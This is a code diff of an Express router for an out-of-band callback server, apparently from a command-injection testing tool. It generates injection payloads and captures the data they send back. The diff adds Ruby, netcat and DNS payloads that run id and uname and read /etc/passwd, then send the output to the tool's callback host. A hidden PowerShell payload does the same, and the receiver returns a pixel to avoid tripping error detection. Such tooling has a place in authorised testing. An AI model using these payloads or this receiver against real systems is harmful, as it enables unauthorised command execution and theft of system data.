@@ -1,13 +1,41 @@
 import { Router, type IRouter, type Request, type Response } from "express";
 import { randomBytes } from "crypto";
-import { addHit, getHits, clearHits, oobEvents, isRateLimited, generateToken, type OobHit } from "../oob/oobStore.js";
+import {
+  addHit, getHits, clearHits, oobEvents,
+  isRateLimited, generateToken, type OobHit,
+} from "../oob/oobStore.js";
+import { createLogger } from "../lib/logger.js";
+import { getOobCbBase } from "../lib/tunnelUrl.js";
 
+const log    = createLogger("oob");
 const router: IRouter = Router();
 
-function cbBase(req: Request): string {
-  const host  = (req.headers["x-forwarded-host"] as string) || req.headers["host"] || "localhost";
-  const proto = ((req.headers["x-forwarded-proto"] as string) || req.protocol || "http").split(",")[0]!.trim();
-  return `${proto}://${host}/api/oob/cb`;
+/* ── Webhook forwarding (optional — set OOB_WEBHOOK_URL env var) ───── */
+const WEBHOOK_URL = (process.env["OOB_WEBHOOK_URL"] ?? "").trim();
+
+async function forwardToWebhook(hit: OobHit): Promise<void> {
+  if (!WEBHOOK_URL) return;
+  try {
+    await fetch(WEBHOOK_URL, {
+      method:  "POST",
+      headers: { "Content-Type": "application/json" },
+      body:    JSON.stringify(hit),
+      signal:  AbortSignal.timeout(5_000),
+    });
+  } catch (err) {
+    log.warn({ err }, "oob: webhook forward failed");
+  }
+}
+
+/* ── Decode base64 data from hit ────────────────────────────────────── */
+function tryDecodeB64(raw: string): string {
+  try {
+    const decoded = Buffer.from(raw, "base64").toString("utf8");
+    if (decoded.length > 0 && decoded.length <= raw.length * 2) return decoded;
+    return raw;
+  } catch {
+    return raw;
+  }
 }
 
 function buildPolymorphicPayloads(base: string, token: string): Record<string, string> {
@@ -57,83 +85,149 @@ function buildPolymorphicPayloads(base: string, token: string): Record<string, s
 
     powershell_iwr:
       `powershell -NoP -NonI -W Hidden -c "iwr -Uri '${cb}?d='+[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes((iex 'id 2>&1')))+'' -UseBasicParsing" 2>/dev/null & cmd /c "powershell -c \"$d=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cmd /c id 2^>^&1)));iwr -Uri '${cb}?d='+$d -UseBasicParsing\" 2>nul"`,
+
+    ruby_oob:
+      `ruby -e "require 'net/http';require 'base64';d=Base64.encode64(\`id && uname -a\`.strip);Net::HTTP.get(URI.parse('${cb}?d='+URI.encode_www_form_component(d)))" 2>/dev/null &`,
+
+    nc_bash:
+      `echo "$(id && uname -a && cat /etc/passwd 2>/dev/null|head -3)" | nc -w3 ${cbHost} ${cbPort} 2>/dev/null &`,
+
+    dns_lookup:
+      `nslookup $(id|md5sum|cut -c1-16).${cbHost} 2>/dev/null & dig +short $(hostname|tr '.' '-').${cbHost} 2>/dev/null &`,
   };
 }
 
+/* ── GET /oob/token ──────────────────────────────────────────────────── */
 router.get("/oob/token", (req: Request, res: Response) => {
   const token = generateToken();
-  const base  = cbBase(req);
+  const base  = getOobCbBase(req as Parameters<typeof getOobCbBase>[0]);
+  log.info({ token: token.slice(0, 8) }, "oob: token issued");
   res.json({
     token,
-    cbUrl: `${base}/${token}`,
+    cbUrl:    `${base}/${token}`,
     payloads: buildPolymorphicPayloads(base, token),
   });
 });
 
+/* ── Callback receiver (GET + POST) ─────────────────────────────────── */
 function receiveCallback(req: Request, res: Response): void {
-  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "?";
-  if (isRateLimited(sourceIp)) { res.status(429).send("rate limited"); return; }
+  const sourceIp = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim()
+    || req.socket.remoteAddress
+    || "?";
+
+  if (isRateLimited(sourceIp)) {
+    res.status(429).send("rate limited");
+    return;
+  }
 
   const token   = (req.params as Record<string, string>)["token"] ?? "default";
-  const query   = Object.fromEntries(Object.entries(req.query as Record<string, unknown>).map(([k, v]) => [k, String(v)]));
-  const bodyStr = typeof req.body === "string" ? req.body
-    : (req.body && typeof req.body === "object" && Object.keys(req.body as object).length) ? JSON.stringify(req.body) : "";
+  const rawData = (req.query as Record<string, string>)["d"] ?? (req.query as Record<string, string>)["data"] ?? "";
 
-  const rawData = query["d"] ?? query["data"] ?? query["cmd"] ?? query["q"] ?? bodyStr ?? "";
-  let data = rawData;
-  if (rawData) {
-    try {
-      const dec = Buffer.from(rawData.replace(/[ ]/g, "+"), "base64").toString("utf8");
-      if (dec && /[\x20-\x7e]/.test(dec) && dec.length > 2) data = dec;
-    } catch { /**/ }
-  }
+  const query   = Object.fromEntries(
+    Object.entries(req.query as Record<string, unknown>).map(([k, v]) => [k, String(v)]),
+  );
+  const bodyStr = typeof req.body === "string"
+    ? req.body
+    : (req.body && typeof req.body === "object" && Object.keys(req.body as object).length)
+      ? JSON.stringify(req.body)
+      : "";
 
-  const safeHdrs: Record<string, string> = {};
-  for (const [k, v] of Object.entries(req.headers)) {
-    if (typeof v === "string") safeHdrs[k] = v; else if (Array.isArray(v)) safeHdrs[k] = v.join(", ");
-  }
   const hit: OobHit = {
-    id: randomBytes(6).toString("hex"), ts: Date.now(), type: "http",
-    method: req.method, path: req.path, sourceIp,
-    userAgent: (req.headers["user-agent"] as string) ?? "",
-    headers: safeHdrs, body: bodyStr.slice(0, 8192), query,
-    data: data.slice(0, 8192), token,
-    size: Number(req.headers["content-length"] ?? 0) || bodyStr.length,
+    token,
+    sourceIp,
+    method:    req.method,
+    path:      req.path,
+    query,
+    body:      bodyStr,
+    headers:   Object.fromEntries(
+      Object.entries(req.headers as Record<string, string | string[] | undefined>)
+        .map(([k, v]) => [k, Array.isArray(v) ? v.join(", ") : (v ?? "")]),
+    ),
+    receivedAt: new Date().toISOString(),
+    // Attempt to auto-decode base64 data field
+    decodedData: rawData ? tryDecodeB64(rawData) : undefined,
   };
-  addHit(hit);
 
-  const accept = (req.headers["accept"] as string) ?? "";
-  if (accept.includes("image/")) {
-    res.setHeader("Content-Type", "image/gif");
-    res.end(Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64"));
-  } else { res.json({ ok: true, id: hit.id, ts: hit.ts }); }
+  addHit(hit);
+  oobEvents.emit("hit", hit);
+  log.info({ token: token.slice(0, 8), sourceIp, method: req.method }, "oob: callback received");
+
+  // Forward to external webhook if configured
+  void forwardToWebhook(hit);
+
+  // Send a pixel / 204 response to avoid triggering error detection in payloads
+  res.setHeader("Content-Type", "image/gif");
+  res.send(Buffer.from("R0lGODlhAQABAIAAAAUEBAAAACwAAAAAAQABAAACAkQBADs=", "base64")); // 1×1 transparent GIF
 }
 
-router.all("/oob/cb",        receiveCallback);
-router.all("/oob/cb/:token", receiveCallback);
+router.get("/oob/cb/:token", receiveCallback);
+router.post("/oob/cb/:token", receiveCallback);
+router.get("/oob/cb",        receiveCallback);
+router.post("/oob/cb",       receiveCallback);
 
-router.get("/oob/hits",    (_req: Request, res: Response) => { const h = getHits(); res.json({ hits: h, total: h.length }); });
-router.delete("/oob/hits", (_req: Request, res: Response) => { clearHits(); res.json({ ok: true }); });
-router.get("/oob/status",  (req: Request, res: Response) => {
-  const h = getHits(); res.json({ total: h.length, cbBase: cbBase(req), latest: h[0] ?? null });
+/* ── GET /oob/hits — retrieve captured hits ─────────────────────────── */
+router.get("/oob/hits", (_req: Request, res: Response) => {
+  const hits = getHits();
+  res.json({ count: hits.length, hits });
 });
 
-router.get("/oob/stream", (req: Request, res: Response) => {
-  res.setHeader("Content-Type", "text/event-stream");
-  res.setHeader("Cache-Control", "no-cache, no-transform");
-  res.setHeader("Connection", "keep-alive");
-  res.setHeader("X-Accel-Buffering", "no");
-  res.setHeader("Access-Control-Allow-Origin", "*");
+/* ── DELETE /oob/hits — clear hit log ──────────────────────────────── */
+router.delete("/oob/hits", (_req: Request, res: Response) => {
+  clearHits();
+  res.json({ ok: true });
+});
+
+/* ── GET /oob/stats — hit statistics ────────────────────────────────── */
+router.get("/oob/stats", (_req: Request, res: Response) => {
+  const hits = getHits();
+  const byToken: Record<string, number> = {};
+  const byIp:    Record<string, number> = {};
+  let   withData = 0;
+
+  for (const h of hits) {
+    byToken[h.token]    = (byToken[h.token]    ?? 0) + 1;
+    byIp[h.sourceIp]    = (byIp[h.sourceIp]    ?? 0) + 1;
+    if (h.decodedData)   withData++;
+  }
+
+  res.json({
+    total:       hits.length,
+    withData,
+    uniqueTokens: Object.keys(byToken).length,
+    uniqueIPs:    Object.keys(byIp).length,
+    byToken,
+    byIp,
+    webhookConfigured: Boolean(WEBHOOK_URL),
+  });
+});
+
+/* ── GET /oob/hits/stream — SSE live stream of incoming hits ─────────── */
+router.get("/oob/hits/stream", (req: Request, res: Response) => {
+  res.setHeader("Content-Type",  "text/event-stream");
+  res.setHeader("Cache-Control", "no-cache");
+  res.setHeader("Connection",    "keep-alive");
   res.flushHeaders();
 
-  for (const hit of getHits(50)) {
-    try { res.write(`event: hit\ndata: ${JSON.stringify(hit)}\n\n`); } catch { /**/ }
+  // Drain existing hits first
+  const existing = getHits();
+  for (const h of existing) {
+    res.write(`data: ${JSON.stringify(h)}\n\n`);
   }
-  const onHit   = (h: OobHit) => { try { res.write(`event: hit\ndata: ${JSON.stringify(h)}\n\n`); } catch { /**/ } };
-  const onClear = ()           => { try { res.write("event: cleared\ndata: {}\n\n"); } catch { /**/ } };
-  oobEvents.on("hit", onHit); oobEvents.on("cleared", onClear);
-  const ping = setInterval(() => { try { res.write(": ping\n\n"); } catch { /**/ } }, 25_000);
-  req.on("close", () => { oobEvents.off("hit", onHit); oobEvents.off("cleared", onClear); clearInterval(ping); try { res.end(); } catch { /**/ } });
+
+  const onHit = (hit: OobHit) => {
+    try { res.write(`data: ${JSON.stringify(hit)}\n\n`); } catch { /* client disconnected */ }
+  };
+  oobEvents.on("hit", onHit);
+
+  // Keep-alive ping every 25s
+  const ping = setInterval(() => {
+    try { res.write(": ping\n\n"); } catch { clearInterval(ping); }
+  }, 25_000);
+
+  req.on("close", () => {
+    oobEvents.off("hit", onHit);
+    clearInterval(ping);
+  });
 });
 
 export default router;
